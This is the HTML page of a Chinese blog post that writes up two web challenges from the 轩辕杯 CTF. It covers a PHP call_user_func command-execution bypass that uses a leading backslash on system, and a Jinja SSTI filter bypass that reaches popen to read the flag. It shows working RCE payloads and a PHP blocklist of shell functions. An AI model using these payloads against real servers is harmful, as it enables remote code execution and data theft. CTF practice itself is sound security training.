@@ -1,0 +1,856 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  
+  <script>window.icon_font = '4552607_tq6stt6tcg';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};</script>
+  
+  
+  <title>
+    轩辕杯 |
+    
+    Flight-star&#39;blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="测试：web：WEBezrce考察点：call_user_func本质利用源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445 &lt;?phperror_reporting(0);highlight_file(__FILE__);function waf($a) &#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="轩辕杯">
+<meta property="og:url" content="http://example.com/2025/05/19/%E8%BD%A9%E8%BE%95%E6%9D%AF/index.html">
+<meta property="og:site_name" content="Flight-star&#39;blog">
+<meta property="og:description" content="测试：web：WEBezrce考察点：call_user_func本质利用源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445 &lt;?phperror_reporting(0);highlight_file(__FILE__);function waf($a) &#123;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/image-20250520105852838-1747709934480-1.png">
+<meta property="og:image" content="http://example.com/images/image-20250520110519840-1747710321524-3.png">
+<meta property="og:image" content="http://example.com/images/image-20250524213735950-1748093857128-1.png">
+<meta property="og:image" content="http://example.com/images/image-20250520121916507-1747714757279-5.png">
+<meta property="og:image" content="http://example.com/images/image-20250520141211116-1747721531701-7.png">
+<meta property="og:image" content="http://example.com/images/image-20250520142045007-1747722046736-9.png">
+<meta property="og:image" content="http://example.com/images/image-20250520142513484-1747722314520-11.png">
+<meta property="og:image" content="http://example.com/images/image-20250520142916422-1747722557239-13.png">
+<meta property="og:image" content="http://example.com/images/image-20250520143055250-1747722655888-15.png">
+<meta property="og:image" content="http://example.com/images/image-20250520143214512-1747722735086-17.png">
+<meta property="og:image" content="http://example.com/images/image-20250520143419412-1747722860089-19.png">
+<meta property="og:image" content="http://example.com/images/image-20250520144300265-1747723382047-21.png">
+<meta property="og:image" content="http://example.com/images/image-20250520153253947-1747726374614-23.png">
+<meta property="og:image" content="http://example.com/images/image-20250520163116390-1747729877244-27.png">
+<meta property="og:image" content="http://example.com/images/image-20250520162954052-1747729795163-25.png">
+<meta property="og:image" content="http://example.com/images/image-20250520165940815-1747731581829-29.png">
+<meta property="og:image" content="http://example.com/images/image-20250520170012521-1747731613231-31.png">
+<meta property="og:image" content="http://example.com/images/image-20250520213737660-1747748258624-33.png">
+<meta property="og:image" content="http://example.com/images/image-20250520222825370-1747751306080-35.png">
+<meta property="og:image" content="http://example.com/images/image-20250520223830714-1747751911500-37.png">
+<meta property="og:image" content="http://example.com/images/image-20250520230452106-1747753493023-39.png">
+<meta property="og:image" content="http://example.com/images/image-20250520231125860-1747753886742-41.png">
+<meta property="og:image" content="http://example.com/images/image-20250520231247448-1747753968110-43.png">
+<meta property="og:image" content="http://example.com/images/image-20250520231314276-1747753994964-45.png">
+<meta property="og:image" content="http://example.com/images/image-20250520231432868-1747754073518-47.png">
+<meta property="og:image" content="http://example.com/images/image-20250521000746072-1747757267160-49.png">
+<meta property="og:image" content="http://example.com/images/image-20250521000815359-1747757296088-51.png">
+<meta property="og:image" content="http://example.com/images/image-20250521002517947-1747758318715-53.png">
+<meta property="og:image" content="http://example.com/images/image-20250521144116081-1747809676770-1.png">
+<meta property="og:image" content="http://example.com/images/image-20250521144306565-1747809787441-3.png">
+<meta property="og:image" content="http://example.com/images/image-20250524214211649-1748094132431-3.png">
+<meta property="og:image" content="http://example.com/images/image-20250521152638411-1747812399046-5.png">
+<meta property="og:image" content="http://example.com/images/image-20250523172952922-1747992593805-1.png">
+<meta property="og:image" content="http://example.com/images/image-20250523173142252-1747992703169-3.png">
+<meta property="og:image" content="http://example.com/images/image-20250524221123574-1748095884312-5.png">
+<meta property="og:image" content="http://example.com/images/image-20250524225148122-1748098309093-7.png">
+<meta property="article:published_time" content="2025-05-19T14:23:03.000Z">
+<meta property="article:modified_time" content="2025-05-24T14:52:12.370Z">
+<meta property="article:author" content="Flight-star">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/image-20250520105852838-1747709934480-1.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Flight-star'blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.0.1/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff5252" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+         M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="#ff5252" />
+        </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/">Home</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/archives">Archives</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/about">About</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/friend">Friend</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="轩辕杯">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">轩辕杯</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-轩辕杯" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/05/19/%E8%BD%A9%E8%BE%95%E6%9D%AF/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-05-19T14:23:03.000Z" itemprop="datePublished">2025-05-19</time>
+    <time style="display: none;" id="post-update-time">2025-05-24</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h1><h2 id="web："><a href="#web：" class="headerlink" title="web："></a>web：</h2><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h1 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h1><h3 id="考察点：call-user-func本质利用"><a href="#考察点：call-user-func本质利用" class="headerlink" title="考察点：call_user_func本质利用"></a>考察点：<font color="red">call_user_func本质利用</font></h3><p><strong>源码：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;shell_exec&quot;</span>, <span class="string">&quot;system&quot;</span>, <span class="string">&quot;passthru&quot;</span>, <span class="string">&quot;proc_open&quot;</span>, <span class="string">&quot;show_source&quot;</span>, </span><br><span class="line">        <span class="string">&quot;phpinfo&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;dl&quot;</span>, <span class="string">&quot;proc_terminate&quot;</span>, <span class="string">&quot;touch&quot;</span>, <span class="string">&quot;escapeshellcmd&quot;</span>, </span><br><span class="line">        <span class="string">&quot;escapeshellarg&quot;</span>, <span class="string">&quot;assert&quot;</span>, <span class="string">&quot;substr_replace&quot;</span>, <span class="string">&quot;call_user_func_array&quot;</span>, </span><br><span class="line">        <span class="string">&quot;call_user_func&quot;</span>, <span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_map&quot;</span>, </span><br><span class="line">        <span class="string">&quot;register_shutdown_function&quot;</span>, <span class="string">&quot;register_tick_function&quot;</span>, <span class="string">&quot;filter_var&quot;</span>, </span><br><span class="line">        <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>, <span class="string">&quot;array_walk&quot;</span>, </span><br><span class="line">        <span class="string">&quot;array_walk_recursive&quot;</span>, <span class="string">&quot;pcntl_exec&quot;</span>, <span class="string">&quot;fopen&quot;</span>, <span class="string">&quot;fwrite&quot;</span>, </span><br><span class="line">        <span class="string">&quot;file_put_contents&quot;</span>, <span class="string">&quot;readfile&quot;</span>, <span class="string">&quot;file_get_contents&quot;</span>, <span class="string">&quot;highlight_file&quot;</span>, <span class="string">&quot;eval&quot;</span></span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;strtolower&#x27;</span>, <span class="variable">$disable_fun</span>);</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$a</span>, <span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;宝宝这对嘛,这不对噢&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="variable">$new</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;new&#x27;</span>];</span><br><span class="line"><span class="variable">$star</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;star&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$num</span>) &amp;&amp; <span class="variable">$num</span> != <span class="number">1234</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;看来第一层对你来说是小case&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) &amp;&amp; <span class="variable">$num</span> &gt; <span class="number">1234</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;还是有点实力的嘛&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$new</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$star</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;看起来你遇到难关了哈哈&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$b</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$new</span>); </span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$b</span>) &#123; </span><br><span class="line">                <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$b</span>, <span class="variable">$star</span>); </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;恭喜你，又成长了&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-测试create-function"><a href="#1-测试create-function" class="headerlink" title="1.测试create_function"></a>1.测试<code>create_function</code></h3><p>老是不行，本地部署也不行，也不知道出错在哪里</p>
+<p><img src="/../images/image-20250520105852838-1747709934480-1.png" alt="image-20250520105852838"></p>
+<h3 id="2-测试文件包含："><a href="#2-测试文件包含：" class="headerlink" title="2.测试文件包含："></a>2.测试文件包含：</h3><p><strong>最开始测试<code>include</code>，发现不行，突然明白<code>include</code>根本就不是函数，是语言结构</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents   <span class="comment">// *</span></span><br><span class="line">fread</span><br><span class="line">fgets</span><br><span class="line">fgetss</span><br><span class="line">file</span><br><span class="line">parse_ini_file</span><br><span class="line">readfile    <span class="comment">// *</span></span><br><span class="line">highlight_file  <span class="comment">// *</span></span><br><span class="line">show_source <span class="comment">// *</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>测试了很久很久，本地部署发现<code>parse_ini_file</code>有点希望</strong></p>
+<p><img src="/../images/image-20250520110519840-1747710321524-3.png" alt="image-20250520110519840"></p>
+<p><strong>可恶啊，<code>call_user_func</code>老是不回显，恶心死我了</strong></p>
+<p><strong><code>implode</code>强制转化也试过了，完全不彳亍</strong></p>
+<h3 id="答案："><a href="#答案：" class="headerlink" title="答案："></a>答案：</h3><p>使用php本质，输入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span>=\system&amp;star=ls</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h3><p><strong>我之前就见过，在<code>Linux</code>里面反斜杠只是为了强调，我想过使用：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span>=sy\stem&amp;star=ls</span><br></pre></td></tr></table></figure>
+
+<p><strong>但是这样子不能成功创建system函数，可是<font color="red"><code>\system</code>就可以创建又可以绕过</font></strong></p>
+<h3 id="成功页面："><a href="#成功页面：" class="headerlink" title="成功页面："></a>成功页面：</h3><p><img src="/../images/image-20250524213735950-1748093857128-1.png" alt="image-20250524213735950"></p>
+<h1 id="SSTI："><a href="#SSTI：" class="headerlink" title="SSTI："></a>SSTI：</h1><h3 id="考察点：当点被过滤时候使用-，attr绕过"><a href="#考察点：当点被过滤时候使用-，attr绕过" class="headerlink" title="考察点：当点被过滤时候使用[]，attr绕过"></a>考察点：<font color="red">当点被过滤时候使用[]，attr绕过</font></h3><p>简单测试WAF：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import</span><br><span class="line">popen</span><br><span class="line">os</span><br><span class="line">lipsum</span><br><span class="line">.</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-初步构造"><a href="#1-初步构造" class="headerlink" title="1.初步构造"></a>1.初步构造</h3><p><code>.</code>利用<code>attr</code>来绕过</p>
+<p>测试<code>cookie</code>失败：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="variable language_">self</span>|attr(request.cookies.a)|attr(request.cookies.b)(request.cookies.c)|attr(request.cookies.d)(request.cookies.e)|attr(request.cookies.f)(request.cookies.g)|attr(<span class="string">&quot;read&quot;</span>)()&#125;&#125; </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="/../images/image-20250520121916507-1747714757279-5.png" alt="image-20250520121916507"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; request|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&quot;os&quot;</span>)|attr(<span class="string">&quot;popen&quot;</span>)(<span class="string">&quot;cat /f*&quot;</span>)|attr(<span class="string">&quot;read&quot;</span>)() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-测试："><a href="#2-测试：" class="headerlink" title="2.测试："></a>2.测试：</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="variable language_">self</span>|attr(<span class="string">&quot;__init__&quot;</span>)|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&quot;__builtins__&quot;</span>) &#125;&#125;</span><br><span class="line">可以回显</span><br><span class="line">&#123;&#123; <span class="variable language_">self</span>|attr(<span class="string">&quot;__init__&quot;</span>)|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&quot;__builtins__&quot;</span>)|attr(<span class="string">&quot;__init__&quot;</span>)|attr(<span class="string">&quot;__imp&quot;</span>+<span class="string">&quot;ort__&quot;</span>) &#125;&#125;</span><br><span class="line">无回显</span><br><span class="line"></span><br><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>|attr(<span class="string">&quot;__class__&quot;</span>)|attr(<span class="string">&quot;__mro__&quot;</span>)[<span class="number">1</span>] &#125;&#125;</span><br><span class="line">返回<span class="number">500</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="attr不行，那就测试中括号"><a href="#attr不行，那就测试中括号" class="headerlink" title="attr不行，那就测试中括号"></a><strong><code>attr</code>不行，那就测试中括号</strong></h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>][<span class="string">&#x27;__ba&#x27;</span>+<span class="string">&#x27;se__&#x27;</span>][<span class="string">&#x27;__subc&#x27;</span>+<span class="string">&#x27;lasses__&#x27;</span>]()[<span class="string">&#x27;__get&#x27;</span>+<span class="string">&#x27;item__&#x27;</span>](<span class="number">133</span>)</span><br><span class="line">成功调用os</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250520141211116-1747721531701-7.png" alt="image-20250520141211116"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>][<span class="string">&#x27;__ba&#x27;</span>+<span class="string">&#x27;se__&#x27;</span>][<span class="string">&#x27;__subc&#x27;</span>+<span class="string">&#x27;lasses__&#x27;</span>]()[<span class="string">&#x27;__get&#x27;</span>+<span class="string">&#x27;item__&#x27;</span>](<span class="number">133</span>)[<span class="string">&#x27;__in&#x27;</span>+<span class="string">&#x27;it__&#x27;</span>][<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>]&#125;&#125;</span><br><span class="line">成功返回os</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250520142045007-1747722046736-9.png" alt="image-20250520142045007"></p>
+<p><strong>该怎么调用呢？</strong></p>
+<p><img src="/../images/image-20250520142513484-1747722314520-11.png" alt="image-20250520142513484"></p>
+<p><strong>为什么会返回None呢？？</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>][<span class="string">&#x27;__ba&#x27;</span>+<span class="string">&#x27;se__&#x27;</span>][<span class="string">&#x27;__subc&#x27;</span>+<span class="string">&#x27;lasses__&#x27;</span>]()[<span class="string">&#x27;__get&#x27;</span>+<span class="string">&#x27;item__&#x27;</span>](<span class="number">133</span>)[<span class="string">&#x27;__in&#x27;</span>+<span class="string">&#x27;it__&#x27;</span>][<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;get&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>干脆不要了，直接输入</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>][<span class="string">&#x27;__ba&#x27;</span>+<span class="string">&#x27;se__&#x27;</span>][<span class="string">&#x27;__subc&#x27;</span>+<span class="string">&#x27;lasses__&#x27;</span>]()[<span class="string">&#x27;__get&#x27;</span>+<span class="string">&#x27;item__&#x27;</span>](<span class="number">133</span>)[<span class="string">&#x27;__in&#x27;</span>+<span class="string">&#x27;it__&#x27;</span>][<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250520142916422-1747722557239-13.png" alt="image-20250520142916422"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>][<span class="string">&#x27;__ba&#x27;</span>+<span class="string">&#x27;se__&#x27;</span>][<span class="string">&#x27;__subc&#x27;</span>+<span class="string">&#x27;lasses__&#x27;</span>]()[<span class="string">&#x27;__get&#x27;</span>+<span class="string">&#x27;item__&#x27;</span>](<span class="number">133</span>)[<span class="string">&#x27;__in&#x27;</span>+<span class="string">&#x27;it__&#x27;</span>][<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;nl /*&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>发现flag</strong></p>
+<p><img src="/../images/image-20250520143055250-1747722655888-15.png" alt="image-20250520143055250"></p>
+<p><strong>flag被WAF</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>][<span class="string">&#x27;__ba&#x27;</span>+<span class="string">&#x27;se__&#x27;</span>][<span class="string">&#x27;__subc&#x27;</span>+<span class="string">&#x27;lasses__&#x27;</span>]()[<span class="string">&#x27;__get&#x27;</span>+<span class="string">&#x27;item__&#x27;</span>](<span class="number">133</span>)[<span class="string">&#x27;__in&#x27;</span>+<span class="string">&#x27;it__&#x27;</span>][<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250520143214512-1747722735086-17.png" alt="image-20250520143214512"></p>
+<h3 id="最终payload："><a href="#最终payload：" class="headerlink" title="最终payload："></a>最终payload：</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>][<span class="string">&#x27;__ba&#x27;</span>+<span class="string">&#x27;se__&#x27;</span>][<span class="string">&#x27;__subc&#x27;</span>+<span class="string">&#x27;lasses__&#x27;</span>]()[<span class="string">&#x27;__get&#x27;</span>+<span class="string">&#x27;item__&#x27;</span>](<span class="number">133</span>)[<span class="string">&#x27;__in&#x27;</span>+<span class="string">&#x27;it__&#x27;</span>][<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;head /fl*&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250520143419412-1747722860089-19.png" alt="image-20250520143419412"></p>
